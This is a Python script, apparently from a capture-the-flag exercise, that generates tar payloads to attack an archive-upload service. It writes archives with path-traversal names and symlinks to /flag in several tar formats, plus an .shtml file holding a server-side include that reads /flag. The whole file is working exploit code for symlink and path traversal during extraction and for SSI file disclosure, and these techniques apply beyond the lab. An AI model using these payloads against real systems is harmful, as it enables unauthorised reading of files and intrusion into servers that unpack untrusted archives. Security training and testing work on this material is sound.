#!/usr/bin/env python3
"""Generate multiple tar payload variants for the archiver exploit."""
import tarfile
import os

def create_path_traversal_tars():
    """Create tars with path traversal filenames."""
    targets = [
        ("traversal_simple.tar", "../../../flag"),
        ("traversal_deep.tar", "../../../../../../flag"),
        ("traversal_flag_txt.tar", "../../../flag.txt"),
        ("traversal_root_flag.tar", "../../../../../../root/flag"),
    ]
    
    for tar_name, path in targets:
        with tarfile.open(tar_name, "w") as tar:
            # Create a TarInfo with the traversal path
            ti = tarfile.TarInfo(path)
            ti.type = tarfile.SYMTYPE
            ti.linkname = "/flag"
            tar.addfile(ti)
        print(f"Created {tar_name} with symlink: {path} -> /flag")

def create_format_variants():
    """Create symlink tars in different formats."""
    formats = [
        ("symlink_pax.tar", tarfile.PAX_FORMAT),
        ("symlink_gnu.tar", tarfile.GNU_FORMAT),
        ("symlink_ustar.tar", tarfile.USTAR_FORMAT),
    ]
    
    for tar_name, fmt in formats:
        with tarfile.open(tar_name, "w", format=fmt) as tar:
            ti = tarfile.TarInfo("flag")
            ti.type = tarfile.SYMTYPE
            ti.linkname = "/flag"
            tar.addfile(ti)
        print(f"Created {tar_name} (format: {fmt})")

def create_shtml_payload():
    """Create a tar with an .shtml file containing SSI to read /flag."""
    shtml_content = b'<!--#include file="/flag" -->'
    
    with tarfile.open("ssi_payload.tar", "w") as tar:
        ti = tarfile.TarInfo("flag.shtml")
        ti.size = len(shtml_content)
        import io
        tar.addfile(ti, io.BytesIO(shtml_content))
    print("Created ssi_payload.tar with flag.shtml")

def create_absolute_symlink():
    """Create tar with absolute path symlink."""
    with tarfile.open("absolute_symlink.tar", "w") as tar:
        ti = tarfile.TarInfo("getflag")
        ti.type = tarfile.SYMTYPE
        ti.linkname = "/flag"
        ti.mode = 0o777
        tar.addfile(ti)
    print("Created absolute_symlink.tar with getflag -> /flag")

if __name__ == "__main__":
    os.chdir(r"C:\Users\Alexandru Moga\Documents\first-gooogot-game\explo")
    
    create_path_traversal_tars()
    create_format_variants()
    create_shtml_payload()
    create_absolute_symlink()
    
    print("\n✓ All payloads generated successfully!")
    print("Files created:")
    for f in os.listdir("."):
        if f.endswith(".tar"):
            print(f"  - {f}")
